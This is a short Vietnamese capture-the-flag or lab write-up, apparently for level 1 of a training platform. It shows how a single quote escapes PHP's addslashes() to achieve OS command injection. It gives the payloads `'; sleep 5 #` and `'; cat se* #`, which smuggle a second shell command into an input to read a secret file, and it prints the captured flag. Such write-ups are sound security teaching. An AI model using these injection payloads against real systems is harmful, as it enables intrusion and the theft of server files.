* Level 1 khá đơn giản, backend sử dụng hàm `addslashes()` trong PHP để thêm dấu backslash khi phát hiện các ký tự:

```
single quote (')
double quote (")
backslash (\)
NUL (the NUL byte)
```

→ Vậy payload sẽ là: `'; sleep 5 #` 

* Giải thích:

```plaintext
'; sleep 5 #
↑  ↑   ↑   ↑
│  │   │   └── #       → comment phần còn lại
│  │   └────── sleep 5 → lệnh thực thi
│  └────────── ;       → thực thi lệnh tiếp theo
└───────────── '       → đóng quote → escape ra ngoài
```

* Mục tiêu là đọc được file secret ở dưới backend, nên em đã đổi payload thành: `'; cat se* #` là đã đọc được flag: `CBJS{b38e625204bd8d09089d3eacc3a9c862}`

![](https://uploads.linear.app/b471c4ef-0f5a-4e1c-b641-7b7285ddb9ac/141965cd-ead4-4749-a9f9-89d5a68700f1/b73544a2-4509-4004-bf8c-f3ff5d57866b?signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXRoIjoiL2I0NzFjNGVmLTBmNWEtNGUxYy1iNjQxLTdiNzI4NWRkYjlhYy8xNDE5NjVjZC1lYWQ0LTQ3NDktYTlmOS04OWQ1YTY4NzAwZjEvYjczNTQ0YTItNDUwOS00MDA0LWJmOGMtZjNmZjVkNTc4NjZiIiwiaWF0IjoxNzg2OTUwOTMzLCJleHAiOjE3ODY5OTQxMzN9.HyeFNqemqAw7LOq_OD1EhdLh_WeZiWruZ3XRGe1uqrs)